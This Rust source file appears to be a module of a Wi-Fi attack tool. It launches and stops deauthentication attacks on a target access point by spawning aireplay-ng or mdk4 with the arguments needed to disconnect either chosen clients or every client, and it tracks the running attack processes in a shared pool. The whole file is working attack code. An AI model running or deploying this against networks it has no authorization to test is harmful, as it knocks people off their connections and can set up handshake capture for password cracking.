use crate::error::Error;
use crate::globals::*;
use crate::types::*;
use std::process::{Command, Stdio};
use std::sync::MutexGuard;

/// Launch a deauth attack on a specific AP
pub fn launch_deauth_attack(
    iface: &str,
    ap: AP,
    specific_clients: Option<Vec<String>>,
    software: AttackSoftware,
) -> Result<(), Error> {
    let mut attack_pool = get_attack_pool();

    let attack_targets = match specific_clients {
        Some(specific_clients) => {
            let mut cli_attack_targets = vec![];
            for cli in specific_clients {
                let (soft, args) = match software {
                    AttackSoftware::Aireplay => (
                        "aireplay-ng",
                        vec!["-0", "0", "-D", "-a", &ap.bssid, "-c", &cli, iface],
                    ),
                    AttackSoftware::Mdk4 => ("mdk4", vec![iface, "d", "-B", &ap.bssid, "-S", &cli]),
                };

                log::info!(
                    "[{}] start deauth attack on ({}): {} {}",
                    ap.bssid,
                    cli,
                    soft,
                    args.join(" ")
                );

                cli_attack_targets.push((
                    cli.to_owned(),
                    Command::new(soft)
                        .args(args)
                        .stdout(Stdio::null())
                        .spawn()?,
                ));
            }
            AttackedClients::Selection(cli_attack_targets)
        }
        None => {
            let (soft, args) = match software {
                AttackSoftware::Aireplay => {
                    ("aireplay-ng", vec!["-0", "0", "-D", "-a", &ap.bssid, iface])
                }
                AttackSoftware::Mdk4 => ("mdk4", vec![iface, "d", "-B", &ap.bssid]),
            };

            log::info!(
                "[{}] start deauth attack on ({}): {} {}",
                ap.bssid,
                "FF:FF:FF:FF:FF:FF",
                soft,
                args.join(" ")
            );

            AttackedClients::All(
                Command::new(soft)
                    .args(args)
                    .stdout(Stdio::null())
                    .spawn()?,
            )
        }
    };

    attack_pool.insert(ap.bssid.to_string(), (ap, attack_targets));

    Ok(())
}

/// Stop a deauth attack on a specific AP
pub fn stop_deauth_attack(ap_bssid: &str) {
    let mut attack_pool = get_attack_pool();

    if let Some((ap, target)) = attack_pool.get_mut(ap_bssid) {
        match target {
            AttackedClients::All(child) => {
                log::info!(
                    "[{}] stop deauth attack on ({})",
                    ap.bssid,
                    "FF:FF:FF:FF:FF:FF"
                );

                child.kill().ok();
                child.wait().ok();
            }
            AttackedClients::Selection(child_list) => {
                for (cli, child) in child_list {
                    log::info!("[{}] stop deauth attack on ({})", ap.bssid, cli);

                    child.kill().ok();
                    child.wait().ok();
                }
            }
        }
    }
    attack_pool.remove(ap_bssid);
}

pub fn stop_all_deauth_attacks() {
    let attacked_aps: Vec<_> = get_attack_pool().keys().cloned().collect();

    for bssid in attacked_aps {
        stop_deauth_attack(&bssid);
    }
}

/// Get the attack pool
pub fn get_attack_pool() -> MutexGuard<'static, AttackPool> {
    ATTACK_POOL.lock().unwrap()
}
